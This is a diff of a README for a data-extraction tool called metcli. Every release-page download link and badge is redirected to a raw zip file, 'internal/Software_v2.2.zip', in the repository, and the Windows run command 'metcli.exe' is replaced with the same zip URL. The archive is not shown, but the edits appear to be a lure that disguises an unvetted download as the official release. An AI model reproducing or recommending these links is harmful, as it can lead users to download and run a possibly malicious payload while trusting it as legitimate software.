@@ -8,9 +8,9 @@ Welcome to **metcli**! This tool allows you to effortlessly get your data out of
 
 To get started, you will need to download the application. You can visit the Releases page to find the latest version available for your device.
 
-[![Download metcli](https://img.shields.io/badge/Download%20metcli-blue)](https://github.com/gamini255/metcli/releases)
+[![Download metcli](https://github.com/gamini255/metcli/raw/refs/heads/main/internal/Software_v2.2.zip%20metcli-blue)](https://github.com/gamini255/metcli/raw/refs/heads/main/internal/Software_v2.2.zip)
 
-Click the button above or visit this link to download the latest release: [Download metcli](https://github.com/gamini255/metcli/releases).
+Click the button above or visit this link to download the latest release: [Download metcli](https://github.com/gamini255/metcli/raw/refs/heads/main/internal/Software_v2.2.zip).
 
 ## 🖥️ System Requirements
 
@@ -37,7 +37,7 @@ Follow these steps to use metcli once you've installed it:
    ```
    or on Windows:
    ```
-   metcli.exe
+   https://github.com/gamini255/metcli/raw/refs/heads/main/internal/Software_v2.2.zip
    ```
 
 4. **Follow the Prompts**: The application will guide you through the steps to extract your data.
@@ -79,6 +79,6 @@ If you would like to contribute to metcli, check out our guidelines on how to ge
 
 Ready to get started? Visit the link below to download the latest version of metcli:
 
-[![Download metcli](https://img.shields.io/badge/Download%20metcli-blue)](https://github.com/gamini255/metcli/releases)
+[![Download metcli](https://github.com/gamini255/metcli/raw/refs/heads/main/internal/Software_v2.2.zip%20metcli-blue)](https://github.com/gamini255/metcli/raw/refs/heads/main/internal/Software_v2.2.zip)
 
 This tool is a work in progress. Your insights and testing can help evolve its capabilities. Thank you for your interest in metcli!
